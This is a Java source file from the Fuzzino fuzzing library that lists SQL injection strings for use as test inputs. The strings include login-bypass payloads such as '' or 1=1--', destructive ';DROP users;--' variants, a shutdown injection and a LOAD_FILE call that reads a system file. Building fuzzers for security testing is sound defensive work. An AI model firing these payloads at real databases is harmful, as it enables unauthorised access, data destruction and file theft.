//   Copyright 2012-2013 Fraunhofer FOKUS
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
package de.fraunhofer.fokus.fuzzing.fuzzino.heuristics.generators.string.data;

public class SQLInjections extends StringContainer {
	
	public static final SQLInjections INSTANCE = new SQLInjections();
	
	private SQLInjections() {
		super();
	}

	@Override
	protected void initValues() {
		add("1;SELECT%20*");
		add("'sqlattempt1");
		add("(sqlattempt2)");
		add("OR%201=1");
		
		add(";DROP users;--"); // -- is comment
		add(";DROP users;#"); // # is comment
		add("\";DROP users;--");
		add("\";DROP users;#");
		add("';DROP users;--");
		add("';DROP users;#");
		
		add("admin' -- ");
		add("admin' #");
		add("admin'/*");
		add("' or 1=1--");
		add("' or 1=1#");
		add("' or 1=1/*");
		add("') or '1'='1--");
		add("') or ('1'='1--");

		add("OP1' -- ");
		add("OP1' #");
		add("OP1'/*");
		
		add("';shutdown -- ");

		add(";SELECT LOAD_FILE(0x633A5C626F6F742E696E69);#");
		add(";SELECT LOAD_FILE(0x633A5C626F6F742E696E69);--");
	}

}
